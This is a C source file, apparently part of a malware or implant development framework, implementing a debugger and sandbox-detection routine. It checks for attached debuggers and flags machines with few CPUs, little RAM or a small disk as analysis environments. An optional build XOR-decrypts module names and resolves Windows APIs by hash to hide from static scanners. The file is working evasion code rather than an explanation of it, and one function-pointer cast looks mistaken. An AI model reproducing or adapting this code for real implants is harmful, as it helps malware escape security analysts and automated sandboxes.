//
// Created by 0xtriboulet on 4/9/2023.
//

#include "Config.h"
#include "AntiDebug.h"
#include "Obfuscation.h"
#include "Strings.h"
#include "Defs.h"
#include "Utilities.h"
// Provides basic anti-debugging and anti-emulation techniques. Easily bypassable by analysis
// References:
//   Checkpoint:        https://anti-debug.checkpoint.com/
//   0xPat's blog here: https://0xpat.github.io/Malware_development_part_2/
#if CONFIG_ANTI_DEBUG
unsigned char s_xk[] = S_XK;
#endif


BOOL IsDebugged()
{
    BOOL outBool = TRUE;     // CheckRemoteDebugger MUST set this to false

#if CONFIG_ANTI_DEBUG && CONFIG_OBFUSCATION
    unsigned char s_string[] = S_KERNEL32;
    unsigned char d_string[13] = {0};
    xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk));
    mem_cpy(d_string,s_string,12);

    HANDLE p_kernel32 = GetModuleHandle(d_string);

    IsDebuggerPresent_t p_IsDebuggerPresent= (IsDebuggerPresent_t) get_proc_address_by_hash(p_kernel32, IsDebuggerPresent_CRC32B);
    CheckRemoteDebuggerPresent_t p_CheckRemoteDebuggerPresent= (CheckRemoteDebuggerPresent_t) get_proc_address_by_hash(p_kernel32, CheckRemoteDebuggerPresent_CRC32B);

    p_CheckRemoteDebuggerPresent(NtCurrentProcess, &outBool);

    if (p_IsDebuggerPresent() || outBool) return TRUE;


    // check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo_t p_GetSystemInfo= (GetSystemInfo_t) get_proc_address_by_hash(p_kernel32, GetSystemInfo_CRC32B);
    p_GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 4) return TRUE;

    // check RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx_t p_GlobalMemoryStatusEx = (GlobalMemoryStatusEx_t) get_proc_address_by_hash(p_kernel32, GlobalMemoryStatusEx_CRC32B);
    p_GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 4096) return TRUE;

    // check HDD
    CreateFileW_t p_CreateFileW= (CreateFileW_t) get_proc_address_by_hash(p_kernel32, CreateFileW_CRC32B);
    HANDLE hDevice = p_CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl_t p_DeviceIoControl = (CreateFileW_t) get_proc_address_by_hash(p_kernel32, DeviceIoControl_CRC32B);
    p_DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) return TRUE;

#elif CONFIG_ANTI_DEBUG
    CheckRemoteDebuggerPresent(NtCurrentProcess, &outBool);

    if (IsDebuggerPresent() || outBool) return TRUE;


    // check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 4) return TRUE;

    // check RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 4096) return TRUE;

    // check HDD
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) return TRUE;


#endif // CONFIG_ANTI_DEBUG

    return FALSE;
}

